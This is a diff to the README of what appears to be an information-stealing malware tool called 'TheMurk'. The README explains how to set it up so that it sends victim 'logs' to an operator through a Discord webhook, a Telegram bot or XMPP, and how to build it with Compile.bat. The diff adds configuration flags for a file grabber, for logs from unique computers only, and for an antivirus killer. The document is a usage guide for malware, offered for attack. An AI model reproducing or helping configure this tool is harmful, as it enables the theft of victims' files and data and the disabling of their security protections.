@@ -133,7 +133,9 @@ Insert this data in builder console. And wait, secure building will take about 2
 ### 🎮For Discord
 Finally, insert the name and webhook link in the `TheMurk.py` here
 ```
-enableFileGrubber = False # do you want to use file grubber
+enableFileGrubber = False #enable file grabber
+oneStart = False #enable this if you want logs to come only from unique computers
+avKiller = False #enable antiviruses killer
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 discordData = ["url of your WebHook","name of that WebHook"]
 ```
@@ -142,7 +144,9 @@ and run `Compile.bat`
 ### 📨For Telegram
 Finally, insert the name and webhook link in the `TheMurk.py` here
 ```
-enableFileGrubber = False # do you want to use file grubber
+enableFileGrubber = False #enable file grabber
+oneStart = False #enable this if you want logs to come only from unique computers
+avKiller = False #enable antiviruses killer
 sendType = 1 # 0 via Discord; 1 via Telegram; 2 via XMPP
 TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
 ```
@@ -151,7 +155,9 @@ and run `Compile.bat`
 ### 📡For XMPP
 Finally, insert the name and webhook link in the `TheMurk.py` here
 ```
-enableFileGrubber = False # do you want to use file grubber
+enableFileGrubber = False #enable file grabber
+oneStart = False #enable this if you want logs to come only from unique computers
+avKiller = False #enable antiviruses killer
 sendType = 2 # 0 via Discord; 1 via Telegram; 2 via XMPP
 xmppData = ["jabberid","jabberpassword","jabberreceiver"]
 ```
